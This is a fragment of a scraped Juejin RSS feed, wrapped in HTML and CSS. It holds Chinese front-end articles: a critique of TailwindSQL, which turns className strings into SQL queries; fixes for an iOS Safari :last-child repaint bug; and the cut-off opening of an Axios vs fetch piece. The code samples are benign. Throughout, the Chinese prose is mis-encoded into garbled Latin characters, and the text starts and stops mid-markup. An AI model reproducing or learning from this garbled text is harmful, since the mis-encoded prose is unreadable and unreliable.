12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼</h2>
<p><img src="https://static.xxytime.top/2026/01/02/55bd7944-ebd6-4f3b-b58e-e39e7a87dfd4.jpg" alt="cover_image" loading="lazy"/></p>
<p>åˆæ¬¡æ¥è§¦åˆ°è¿™ä¸ªé¡¹ç›®æ—¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”åªæœ‰<strong>å››ä¸ªå­—</strong>ï¼š</p>
<p><img src="https://static.xxytime.top/2026/01/02/33a1f186-3dec-4908-b317-762ea60d84e3.jpg" alt="" loading="lazy"/></p>
<p><strong>è¿™ä¹Ÿè¡Œï¼Ÿ</strong></p>
<p>æœ€è¿‘åœ¨ <strong>X</strong> ä¸Šå¤§ç«çš„ä¸€ä¸ªå« <strong>TailwindSQL</strong> çš„é¡¹ç›®ï¼Œå¼•å‘äº†å¹¿æ³›è®¨è®ºã€‚</p>
<p><img src="https://static.xxytime.top/2026/01/02/d00b126c-cb2a-4931-bf91-82c02533bad4.jpg" alt="" loading="lazy"/></p>
<p>å…¶æ ¸å¿ƒç©æ³•éå¸¸ç®€å•â€”â€”<strong>é€šè¿‡ CSS çš„ className æ¥å®ç° SQL æŸ¥è¯¢åŠŸèƒ½ã€‚</strong></p>
<h3 data-id="heading-1">å‰ç«¯å‘å±•åˆ°è¿™ä¸ªåœ°æ­¥äº†å—ï¼Ÿ</h3>
<p>è®©æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;DB <span class="hljs-attr">className</span>=<span class="hljs-string">"db-users-name-where-id-1"</span> /&gt;
</code></pre>
<p>å¦‚æœä½ æ˜¯<strong>å‰ç«¯å¼€å‘è€…</strong>ï¼Œå¯èƒ½ä¼šä¸‹æ„è¯†åœ°è®¤ä¸ºè¿™æ˜¯åœ¨<code>å®šä¹‰æ ·å¼</code>ï¼›</p>
<p>ä½†å¦‚æœä½ æ˜¯<strong>åç«¯å¼€å‘è€…</strong>ï¼Œä¼°è®¡å·²ç»å¼€å§‹çš±çœ‰äº†ã€‚</p>
<p>ç„¶è€Œå®é™…ä¸Šï¼Œè¿™æ®µä»£ç æ‰§è¡Œçš„æ˜¯ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">SELECT name FROM users WHERE <span class="hljs-attr">id</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
</code></pre>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ç¡®å®æ„£äº†ä¸€ä¸‹ã€‚</p>
<h3 data-id="heading-2">TailwindSQL çš„æœ¬è´¨</h3>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå°† <strong>SQL</strong> è¯­å¥æ‹†è§£ä¸ºä¸€ä¸ªä¸ª<code>ã€Œç±»åã€</code>ç‰‡æ®µã€‚</p>
<p>è¿™ç§åšæ³•ç±»ä¼¼äº <code>TailwindCSS</code> å¯¹ <code>CSS</code> çš„å¤„ç†æ–¹å¼ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">db-users
db-users-name
db-users-name-<span class="hljs-keyword">where</span>-id<span class="hljs-number">-1</span>
db-products-<span class="hljs-keyword">orderby</span>-price-desc
</code></pre>
<p>è¿™äº› <strong>className</strong> æœ€ç»ˆä¼šè¢«è§£æä¸º <code>SQL</code> è¯­å¥ï¼Œå¹¶åœ¨ <strong>React Server Components</strong> ä¸­ç›´æ¥æ‰§è¡Œã€‚</p>
<p>ä½ ç”šè‡³æ— éœ€ç¼–å†™ <strong>API</strong> æ¥å£ï¼Œä¹Ÿæ— éœ€ä½¿ç”¨ <strong>ORM</strong> æ¡†æ¶ã€‚</p>
<h3 data-id="heading-3">è¿™ä¸ªæ–¹æ¡ˆå¯é å—ï¼Ÿ</h3>
<p>ä»å·¥ç¨‹å®è·µçš„è§’åº¦æ¥çœ‹ï¼Œç­”æ¡ˆå…¶å®å¾ˆæ˜ç¡®ï¼š</p>
<p><strong>å¹¶ä¸å¯é ã€‚</strong></p>
<p><strong>SQL</strong> çš„å¤æ‚æ€§ï¼Œä»æ¥ä¸æ˜¯è¯­æ³•å±‚é¢çš„é—®é¢˜ã€‚</p>
<p>çœŸæ­£çš„æŒ‘æˆ˜åœ¨äºï¼š</p>
<ul>
<li>
<p><strong>è¡¨å…³ç³»ç®¡ç†</strong></p>
</li>
<li>
<p><strong>å¤æ‚ JOIN æ“ä½œ</strong></p>
</li>
<li>
<p><strong>åµŒå¥—å­æŸ¥è¯¢</strong></p>
</li>
<li>
<p><strong>äº‹åŠ¡æ§åˆ¶</strong></p>
</li>
<li>
<p><strong>æƒé™éªŒè¯</strong></p>
</li>
<li>
<p><strong>è¾¹ç•Œæ¡ä»¶å¤„ç†</strong></p>
</li>
</ul>
<p>ä¸€æ—¦æŸ¥è¯¢é€»è¾‘ç¨æ˜¾å¤æ‚ï¼Œ<strong>className</strong> å°±ä¼šå˜å¾—è¶Šæ¥è¶Šå†—é•¿ï¼Œæœ€ç»ˆå½¢æˆä¸€ä¸²éš¾ä»¥ç»´æŠ¤çš„ä»£ç ç‰‡æ®µã€‚</p>
<p>è¯´å®è¯ï¼Œæˆ‘å¾ˆéš¾æƒ³è±¡åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œä¼šæœ‰å¼€å‘è€…è®¤çœŸåœ°å†™å‡ºè¿™æ ·çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">className</span>=<span class="hljs-string">"db-orders-user-products-joinwhere-user-age-gt-18and-order-status-paidgroupby-user-id"</span>
</code></pre>
<p>è¿™å·²ç»ä¸å†æ˜¯ DSLï¼ˆé¢†åŸŸç‰¹å®šè¯­è¨€ï¼‰äº†ï¼Œè€Œæ˜¯ä¸€ç§æŠ˜ç£¨ã€‚</p>
<p>æˆ‘è®¤ä¸º <strong>TailwindSQL</strong> å¾ˆéš¾åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¾—åˆ°åº”ç”¨ï¼Œå®ƒæ›´åƒæ˜¯ <strong>vibe coding</strong>ï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰çš„äº§ç‰©ã€‚</p>
<p>æ˜¯å¦ä½¿ç”¨ï¼Ÿå¯ä»¥äº†è§£ä¸€ä¸‹ï¼Œç„¶åç»§ç»­ç¼–å†™ä½ ç†Ÿæ‚‰çš„ <strong>SQL</strong> å§ã€‚</p>
<ul>
<li><strong>TailwindSQL å®˜ç½‘</strong>ï¼š<code>https://tailwindsql.com/</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨iosä¸ŠåŠ¨æ€æ’å…¥å…ƒç´ çš„åˆ—è¡¨ä½¿ç”¨:last-childæ ·å¼å¯èƒ½ä¸èƒ½åŠæ—¶ç”Ÿæ•ˆ]]></title>    <link>https://juejin.cn/post/7589958976226967562</link>    <guid>https://juejin.cn/post/7589958976226967562</guid>    <pubDate>2026-01-02T09:39:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589958976226967562" data-draft-id="7589962224796041254" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨iosä¸ŠåŠ¨æ€æ’å…¥å…ƒç´ çš„åˆ—è¡¨ä½¿ç”¨:last-childæ ·å¼å¯èƒ½ä¸èƒ½åŠæ—¶ç”Ÿæ•ˆ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T09:39:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tjswk2008"/> <meta itemprop="url" content="https://juejin.cn/user/3949101496404295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨iosä¸ŠåŠ¨æ€æ’å…¥å…ƒç´ çš„åˆ—è¡¨ä½¿ç”¨:last-childæ ·å¼å¯èƒ½ä¸èƒ½åŠæ—¶ç”Ÿæ•ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101496404295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tjswk2008
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:39:38.000Z" title="Fri Jan 02 2026 09:39:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™æ˜¯ä¸€ä¸ªåœ¨ iOS Safariï¼ˆWebkit å¼•æ“ï¼‰ä¸­æ¯”è¾ƒç»å…¸çš„æ¸²æŸ“ Bugã€‚å½“é€šè¿‡ JavaScript åŠ¨æ€å‘å®¹å™¨æœ«å°¾æ·»åŠ å…ƒç´ æ—¶ï¼ŒWebkit æœ‰æ—¶æœªèƒ½æ­£ç¡®è§¦å‘é‡ç»˜ï¼ˆRepaintï¼‰æˆ–æ ·å¼é‡æ–°è®¡ç®—ï¼ˆStyle Recalculationï¼‰ï¼Œå¯¼è‡´ <code>:last-child</code> ä¼ªç±»ä»ç„¶åœç•™åœ¨ä¹‹å‰çš„å…ƒç´ ä¸Šã€‚</p>
<p>ä»¥ä¸‹æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„å‡ ç§å¸¸ç”¨æ–¹æ¡ˆï¼ŒæŒ‰æ¨èç¨‹åº¦æ’åºï¼š</p>
<h3 data-id="heading-0">1. å¼ºåˆ¶è§¦å‘é‡ç»˜ (Force Reflow)</h3>
<p>è¿™æ˜¯æœ€ç®€å•ç›´æ¥çš„â€œé»‘ç§‘æŠ€â€ã€‚åœ¨æ’å…¥å…ƒç´ çš„ä»£ç åé¢ï¼Œè¯»å–ä¸€æ¬¡å®¹å™¨æˆ–æ–°å…ƒç´ çš„æŸä¸ªå¸ƒå±€å±æ€§ï¼ˆå¦‚ <code>offsetHeight</code>ï¼‰ï¼Œå¼ºåˆ¶æµè§ˆå™¨åŒæ­¥è®¡ç®—æ ·å¼ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">container</span> = document.getElementById(<span class="hljs-string">'container'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">newItem</span> = document.createElement(<span class="hljs-string">'div'</span>)<span class="hljs-comment">;</span>
container.appendChild(newItem)<span class="hljs-comment">;</span>

// å¼ºåˆ¶è§¦å‘é‡ç»˜
container.offsetHeight<span class="hljs-comment">; </span>
</code></pre>
<h3 data-id="heading-1">2. ä½¿ç”¨ Flex/Grid çš„ <code>gap</code> å±æ€§ (æ¨è)</h3>
<p>å¦‚æœä½ çš„ <code>:last-child</code> ä¸»è¦æ˜¯ä¸ºäº†å¤„ç†é—´è·ï¼ˆä¾‹å¦‚ <code>margin-bottom: 0</code>ï¼‰ï¼Œé‚£ä¹ˆ<strong>å¼ƒç”¨ <code>:last-child</code> æ”¹ç”¨ <code>gap</code></strong> æ˜¯æœ€ç°ä»£ä¸”æ ¹æœ¬çš„è§£å†³æ–¹æ¡ˆã€‚<code>gap</code> ä¼šè‡ªåŠ¨å¤„ç†å…ƒç´ é—´çš„é—´è·ï¼Œä¸éœ€è¦åˆ¤æ–­è°æ˜¯æœ€åä¸€ä¸ªã€‚</p>
<p>CSS</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* å…ƒç´ ä¹‹é—´è‡ªåŠ¨äº§ç”Ÿ 10px é—´è·ï¼Œæœ€åä¸€ä¸ªå…ƒç´ åæ–¹ä¸ä¼šæœ‰é—´è· */</span>
}
</code></pre>
<h3 data-id="heading-2">3. åå‘æ€è·¯ï¼šä½¿ç”¨ <code>:not(:last-child)</code></h3>
<p>æœ‰æ—¶å€™ Webkit å¯¹â€œè°æ˜¯æœ€åä¸€ä¸ªâ€ååº”è¿Ÿé’ï¼Œä½†å¯¹â€œè°ä¸æ˜¯æœ€åä¸€ä¸ªâ€ååº”è¾ƒå¿«ã€‚å°è¯•ç»™æ‰€æœ‰éæœ«å°¾å…ƒç´ è®¾ç½®æ ·å¼ï¼š</p>
<p>CSS</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* ä¸æ¨è */</span>
<span class="hljs-comment">/* .item { margin-bottom: 10px; } */</span>
<span class="hljs-comment">/* .item:last-child { margin-bottom: 0; } */</span>

<span class="hljs-comment">/* æ¨è */</span>
<span class="hljs-selector-class">.item</span><span class="hljs-selector-pseudo">:not</span>(<span class="hljs-selector-pseudo">:last-child</span>) {
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;
}
</code></pre>
<h3 data-id="heading-3">4. æ‰‹åŠ¨åˆ‡æ¢ Class</h3>
<p>å¦‚æœé€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œä¼ªç±»å¤±æ•ˆé¢‘ç¹ï¼Œå»ºè®®æ”¾å¼ƒ CSS ä¼ªç±»ï¼Œæ”¹ç”¨ JavaScript åœ¨æ’å…¥æ—¶æ‰‹åŠ¨ç»´æŠ¤ä¸€ä¸ª <code>.is-last</code> ç±»ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// æ’å…¥é€»è¾‘
const <span class="hljs-attr">items</span> = container.querySelectorAll(<span class="hljs-string">'.item'</span>)<span class="hljs-comment">;</span>
items.forEach(<span class="hljs-attr">el</span> =&gt; el.classList.remove(<span class="hljs-string">'is-last'</span>))<span class="hljs-comment">;</span>
const <span class="hljs-attr">lastItem</span> = items[items.length - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
lastItem.classList.add('is-last')<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Ÿ</h3>
<p>Webkit å¼•æ“ä¸ºäº†æ€§èƒ½ä¼˜åŒ–ï¼Œä¼šå°½é‡å‡å°‘æ ·å¼é‡æ–°è®¡ç®—çš„é¢‘ç‡ã€‚å½“ DOM æ ‘å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå®ƒæœ¬åº”æ ‡è®°è¯¥å®¹å™¨ä¸º "dirty" å¹¶é‡æ–°æ£€æŸ¥ä¼ªç±»çŠ¶æ€ï¼Œä½†åœ¨æŸäº›å¤æ‚çš„åµŒå¥—å¸ƒå±€æˆ–ç‰¹å®šçš„ iOS ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªè§¦å‘æœºåˆ¶ä¼šæ¼æ‰å¯¹ <code>:last-child</code> çš„æ£€æŸ¥ã€‚</p>
<p><strong>å»ºè®®ï¼š</strong> å¦‚æœä½ çš„é¡¹ç›®ç¯å¢ƒå…è®¸ï¼ˆiOS 14.1+ï¼‰ï¼Œä¼˜å…ˆä½¿ç”¨ <strong>Flexbox/Grid çš„ <code>gap</code></strong>ã€‚å®ƒä¸ä»…æ€§èƒ½æ›´å¥½ï¼Œè¿˜èƒ½å½»åº•è§„é¿æ­¤ç±»ç”±äºåŠ¨æ€æ’å…¥å¯¼è‡´çš„ä¼ªç±»å¤±æ•ˆé—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ”¥3 kB æ¢ 120 ms é˜»å¡ï¼Ÿ Axios è¿˜æ˜¯ fetchï¼Ÿ]]></title>    <link>https://juejin.cn/post/7590011643297005606</link>    <guid>https://juejin.cn/post/7590011643297005606</guid>    <pubDate>2026-01-02T09:50:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643297005606" data-draft-id="7590021144779882542" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ”¥3 kB æ¢ 120 ms é˜»å¡ï¼Ÿ Axios è¿˜æ˜¯ fetchï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T09:50:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="404æ˜Ÿçƒçš„çŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/193147068224126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ”¥3 kB æ¢ 120 ms é˜»å¡ï¼Ÿ Axios è¿˜æ˜¯ fetchï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/193147068224126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    404æ˜Ÿçƒçš„çŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:50:09.000Z" title="Fri Jan 02 2026 09:50:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 